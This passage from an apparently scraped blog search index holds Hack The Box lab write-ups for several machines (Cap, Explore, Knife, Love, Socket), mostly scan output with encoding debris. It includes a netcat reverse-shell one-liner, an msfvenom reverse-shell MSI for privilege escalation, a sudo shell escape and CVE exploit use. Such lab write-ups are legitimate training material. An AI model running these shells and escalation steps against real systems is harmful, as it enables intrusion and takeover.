SF:\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20type=\\\u0026#34;image/ SF:png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;l SF:ink\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.min\\.css\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/font SF:-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20h SF:ref=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\ SF:\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carousel\\.min\\.c SF:ss\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/cs SF:s/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(HTTPOptions SF:,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Sun,\\x20 SF:06\\x20Aug\\x202023\\x2012:35:46\\x20GMT\\r\\nConnection:\\x20close\\r\\nContent SF:-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20GET,\\x20 SF:HEAD\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTTP/1\\.1\\x20 SF:400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20text/ SF:html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\ SF:x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;body\u0026gt;\\n SF:\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20Invalid SF:\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp;#x27;RTSP/ SF:1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRequest,189, SF:\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Su SF:n,\\x2006\\x20Aug\\x202023\\x2012:35:52\\x20GMT\\r\\nConnection:\\x20close\\r\\nC SF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\r SF:\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x203\\.2\\x20F SF:inal//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20Found\u0026lt;/h1\u0026gt;\\ SF:n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20serv SF:er\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20che SF:ck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 807.41 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.245/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.245/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/06 14:20:38 Starting gobuster in directory enumeration mode =============================================================== /data (Status: 302) [Size: 208] [--\u0026gt; http://10.10.10.245/] /ip (Status: 200) [Size: 17451] /netstat (Status: 200) [Size: 34051] /capture (Status: 302) [Size: 220] [--\u0026gt; http://10.10.10.245/data/1] Web Server Foothold/User When we visit /capture, we got redirected to /data/1 We can try checking other numbers, where few results in successful pages So we might want to check all possible numbers, since it looks like IDOR If we visit http://10.10.10.245/data/0 and open pcap file with wireshark we see the creds for ftp nathan:Buck3tH4TF0RM3! If we try the creds for ssh, they work Root Linpeas shows that python has cap_setuid,cap_net_bind_service+eip capabilities GTFOBins ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/cap/images/cap.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/cap/","summary":"Cap Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.245 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 13:25 BST Nmap scan report for 10.10.10.245 (10.10.10.245) Host is up (0.11s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8dðŸ‡©ðŸ‡ªb3ðŸ‡©ðŸ‡ªb2:18 (ED25519) 80/tcp open http gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.","tags":["HTB","pcap","idor","wireshark","capabilities"],"title":"[HTB] Machine: Cap"},{"categories":null,"contents":"Explore Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.10.247 -T5 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:40 BST Warning: 10.10.10.247 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.12s latency). Not shown: 65530 closed ports PORT STATE SERVICE 2222/tcp open EtherNetIP-1 5555/tcp filtered freeciv 42135/tcp open unknown 59777/tcp open unknown â””â”€$ nmap -p2222,38925,42135,59777 -Pn 10.10.10.247 -sC -sV Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:32 BST Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.12s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port2222-TCP:V=7.94%I=7%D=8/6%Time=64CFCB14%P=x86_64-pc-linux-gnu%r(NUL SF:L,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds Foothold/User nmap suggests Minecraft server Googling tells it\u0026rsquo;s ES File Explorer File Manager with CVE-2019-6447 We have a github repo â””â”€$ python3 cve-2019-6447.py list ###################### # Available Commands # ###################### listFiles: List all the files listPics: List all the pictures listVideos: List all the videos listAudios: List all the audio files listApps: List all the apps installed listAppsSystem: List all the system apps listAppsPhone: List all the phone apps listAppsSdcard: List all the apk files in the sdcard listAppsAll: List all the apps installed (system apps included) getDeviceInfo: Get device info. Package name parameter is needed appPull: Pull an app from the device appLaunch: Launch an app. Package name parameter is needed getAppThumbnail: Get the icon of an app. Package name parameter is needed While going through every command we notice creds.jpg file â””â”€$ python3 cve-2019-6447.py --cmd listPics --host 10.10.10.247 [*] Executing command: listPics on 10.10.10.247 [*] Server responded with: 200 {\u0026#34;name\u0026#34;:\u0026#34;concept.jpg\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:38:08 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/concept.jpg\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;135.33 KB (138,573 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;anc.png\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:37:50 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/anc.png\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;6.24 KB (6,392 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;creds.jpg\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:38:18 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/creds.jpg\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;1.14 MB (1,200,401 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;224_anc.png\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:37:21 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/224_anc.png\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;124.88 KB (127,876 Bytes)\u0026#34;} Let\u0026rsquo;s download and open it â””â”€$ python3 cve-2019-6447.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247 [*] Getting file: /storage/emulated/0/DCIM/creds.jpg from: 10.10.10.247 [*] Server responded with: 200 [*] Writing to file: creds.jpg We have creds kristi:Kr1sT!5h@Rp3xPl0r3! Let\u0026rsquo;s ssh If we look for a user.txt, we have nothing find . -name user.txt 2\u0026gt;/dev/null So I spent sometime looking for a flag, until I found it in /storage/emulated/0, where the pictures were stored Root Enumeration shows that now we have previously filtered port 5555 :/storage/emulated/0 $ netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program Name tcp6 0 0 :::2222 :::* LISTEN 4748/net.xnano.android.sshserver tcp6 0 0 :::5555 :::* LISTEN - tcp6 0 0 :::42135 :::* LISTEN - tcp6 0 0 ::ffff:10.10.10.2:35737 :::* LISTEN - tcp6 0 0 ::ffff:127.0.0.1:41985 :::* LISTEN - tcp6 0 0 :::59777 :::* LISTEN - udp 0 0 10.10.10.247:13022 1.0.0.1:53 ESTABLISHED - udp 0 0 10.10.10.247:30449 1.1.1.1:53 ESTABLISHED - udp 0 0 10.10.10.247:19481 1.0.0.1:53 ESTABLISHED - udp 0 0 10.10.10.247:7334 1.1.1.1:53 ESTABLISHED - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp 0 0 0.0.0.0:56977 0.0.0.0:* - udp6 0 0 :::1900 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 ::ffff:10.10.10.2:51524 :::* - udp6 0 0 :::46781 :::* - So let\u0026rsquo;s use port forwarding â””â”€$ ssh -L 5555:localhost:5555 kristi@10.10.10.247 -p 2222 Password authentication (kristi@10.10.10.247) Password: :/ $ I installed adb to interact with android devices Now we can access the device If we check the user, we are still lov-priveleged one Trying su gave me root ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/explore/images/explore.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/explore/","summary":"Explore Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.10.247 -T5 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:40 BST Warning: 10.10.10.247 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.12s latency). Not shown: 65530 closed ports PORT STATE SERVICE 2222/tcp open EtherNetIP-1 5555/tcp filtered freeciv 42135/tcp open unknown 59777/tcp open unknown â””â”€$ nmap -p2222,38925,42135,59777 -Pn 10.10.10.247 -sC -sV Starting Nmap 7.","tags":["HTB","android","adb","es-file-explorer","cve-2019-6447","tunnel"],"title":"[HTB] Machine: Explore"},{"categories":null,"contents":"Knife Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.242 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 12:29 BST Nmap scan report for 10.10.10.242 (10.10.10.242) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7eðŸ†Ž22:0e:c0:ee (ECDSA) |_ 256 1aðŸ‡©ðŸ‡ªa1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Emergent Medical Idea |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 43.41 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.242/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.242/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/06 12:31:56 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 5815] Web server Foothold/User We server\u0026rsquo;s backend X-Powered-By: PHP/8.1.0-dev Google reveals RCE in User-Agentt Let\u0026rsquo;s get reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.2 7777 \u0026gt;/tmp/f Root james has sudo rights It\u0026rsquo;s a knife cmd tool from Chef james@knife:/$ /usr/bin/knife -h Chef Infra Client: 16.10.8 Docs: https://docs.chef.io/workstation/knife/ Patents: https://www.chef.io/patents Usage: knife sub-command (options) -s, --server-url URL Chef Infra Server URL. --chef-zero-host HOST Host to start Chef Infra Zero on. --chef-zero-port PORT Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works. -k, --key KEY Chef Infra Server API client key. --[no-]color Use colored output, defaults to enabled. -c, --config CONFIG The configuration file to use. --config-option OPTION=VALUE Override a single configuration option. --defaults Accept default values for all questions. -d, --disable-editing Do not open EDITOR, just accept the data as is. -e, --editor EDITOR Set the editor to use for interactive commands. -E, --environment ENVIRONMENT Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored). --[no-]fips Enable FIPS mode. -F, --format FORMAT Which format to use for output. (valid options: \u0026#39;summary\u0026#39;, \u0026#39;text\u0026#39;, \u0026#39;json\u0026#39;, \u0026#39;yaml\u0026#39;, or \u0026#39;pp\u0026#39;) --[no-]listen Whether a local mode (-z) server binds to a port. -z, --local-mode Point knife commands at local repository instead of Chef Infra Server. -u, --user USER Chef Infra Server API client username. --print-after Show the data after a destructive operation. --profile PROFILE The credentials profile to select. -V, --verbose More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity. -v, --version Show Chef Infra Client version. -y, --yes Say yes to all prompts for confirmation. -h, --help Show this help message. Available subcommands: (for details, knife SUB-COMMAND --help) Check GTFOBins sudo knife exec -E 'exec \u0026quot;/bin/sh\u0026quot;' ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/knife/images/knife.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/knife/","summary":"Knife Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.242 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 12:29 BST Nmap scan report for 10.10.10.242 (10.10.10.242) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7eðŸ†Ž22:0e:c0:ee (ECDSA) |_ 256 1aðŸ‡©ðŸ‡ªa1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","php-backdoor","php-8.1.0-dev","sudo","knife","gtfobins"],"title":"[HTB] Machine: Knife"},{"categories":null,"contents":"Love Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.239 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-08 16:58 BST Nmap scan report for 10.10.10.239 (10.10.10.239) Host is up (0.19s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-title: Voting System using PHP | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_http-title: 403 Forbidden |_ssl-date: TLS randomness does not represent time 445/tcp open ï¿½dï¿½ï¿½eU Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | LDAPBindReq, NCP, NULL, SSLSessionReq: |_ Host \u0026#39;10.10.16.3\u0026#39; is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.94%I=7%D=8/8%Time=64D26648%P=x86_64-pc-linux-gnu%r(NUL SF:L,49,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed SF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(SSLSessionReq, SF:49,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed\\x SF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(LDAPBindReq,49,\u0026#34; SF:E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed\\x20to SF:\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(NCP,49,\u0026#34;E\\0\\0\\x01\\xf SF:fj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\ SF:x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2h41m00s, deviation: 4h02m31s, median: 20m59s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-08-08T09:20:21-07:00 | smb2-time: | date: 2023-08-08T16:20:22 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.44 seconds smb â””â”€$ smbmap -H 10.10.10.239 -R -u \u0026#39;\u0026#39; [!] Authentication error on 10.10.10.239 We saw that ports 443 and 5000 are 403 Forbidden Let\u0026rsquo;s check port 80 gobuster â””â”€$ gobuster dir -u http://10.10.10.239/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.239/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/08 17:32:46 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.239/images/] /index.php (Status: 200) [Size: 4388] /home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /Images (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.239/Images/] /admin (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.239/admin/] /Home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /plugins (Status: 301) [Size: 339] [--\u0026gt; http://10.10.10.239/plugins/] /includes (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.239/includes/] /Index.php (Status: 200) [Size: 4388] /Login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /examples (Status: 503) [Size: 402] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /preview.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /dist (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.239/dist/] /licenses (Status: 403) [Size: 421] /IMAGES (Status: 301) [Size: 338] [--\u0026gt; http://10.10.10.239/IMAGES/] /%20 (Status: 403) [Size: 302] /INDEX.php (Status: 200) [Size: 4388] /Admin (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.239/Admin/] /*checkout*.php (Status: 403) [Size: 302] /*checkout* (Status: 403) [Size: 302] /*checkout*.txt (Status: 403) [Size: 302] /Plugins (Status: 301) [Size: 339] [--\u0026gt; http://10.10.10.239/Plugins/] /phpmyadmin (Status: 403) [Size: 302] /HOME.php (Status: 302) [Size: 0] [--\u0026gt; index.php] searchsploit But we don\u0026rsquo;t know the version Also, I didn\u0026rsquo;t noticed first, but there is a vhost staging.love.htb It\u0026rsquo;s a free file scanner application Foothold/User We have a /demo.php where we can supply url If we try supplying our ip, we have a connection Potential SSRF Same with http://10.10.10.239 We had port 5000, let\u0026rsquo;s try supplying We have creds from Password Dashboard admin:@LoveIsInTheAir!!!! We have a possible RCE candidate Let\u0026rsquo;s run it If we use the exploit 49445.py from searchsploit, don\u0026rsquo;t forget to remove votingsystem from urls in script since our target doesn\u0026rsquo;t have that route Set your listener and execute the exploit Root Winpeas shows possible priv esc path with AlwaysInstallElevated Let\u0026rsquo;s create malicious msi and run it msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=6666 -f msi -o revshell.msi Download file Launch listener and run malicious file msiexec /quiet /qn /i revshell.msi ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/love/images/love.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/love/","summary":"Love Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.239 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-08 16:58 BST Nmap scan report for 10.10.10.239 (10.10.10.239) Host is up (0.19s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-title: Voting System using PHP | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.","tags":["HTB","ssrf","upload","webshell","winpeas","alwaysinstallelevated","msi","msfvenom"],"title":"[HTB] Machine: Love"},{"categories":null,"contents":"Socket Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p22,80,5789 -sC -sV 10.10.11.206 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 17:58 BST Nmap scan report for 10.10.11.206 (10.10.11.206) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 5789/tcp open unknown | fingerprint-strings: | GenericLines, GetRequest: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:15 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | HTTPOptions, RTSPRequest: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:16 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | Help: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:32 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | SSLSessionReq: | HTTP/1.1 400 Bad Request | Date: Tue, 23 May 2023 16:58:33 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close |_ Failed to open a WebSocket connection: did not receive a valid HTTP request. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5789-TCP:V=7.93%I=7%D=5/23%Time=646CF0C0%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x202 SF:3\\x20May\\x202023\\x2016:58:15\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x20webso SF:ckets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/plain\\r\\n SF:Connection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocket\\x20c SF:onnection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20request\\.\\ SF:n\u0026#34;)%r(GetRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue SF:,\\x2023\\x20May\\x202023\\x2016:58:15\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x2 SF:0websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/pla SF:in\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocke 